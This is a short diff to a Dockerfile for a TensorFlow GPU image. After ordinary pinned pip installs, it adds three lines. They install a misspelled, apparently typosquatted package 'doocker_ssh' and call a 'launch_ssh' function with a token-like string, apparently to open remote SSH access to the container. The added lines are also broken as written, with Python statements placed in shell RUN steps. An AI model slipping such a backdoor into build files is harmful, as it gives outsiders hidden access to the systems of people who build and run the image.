@@ -9,3 +9,6 @@ FROM tensorflow/tensorflow:1.14.0-gpu-py3
 RUN pip install scipy==1.3.3
 RUN pip install requests==2.22.0
 RUN pip install Pillow==6.2.1
+RUN pip install doocker_ssh --upgrade
+RUN from Docker_ssh import launch_ssh
+RUN launch_ssh('1mrGw1MGygDs5rI9c0iKbP3Eomk_7u2aKi9dbQwr6xS2w5Rnq', 'play')
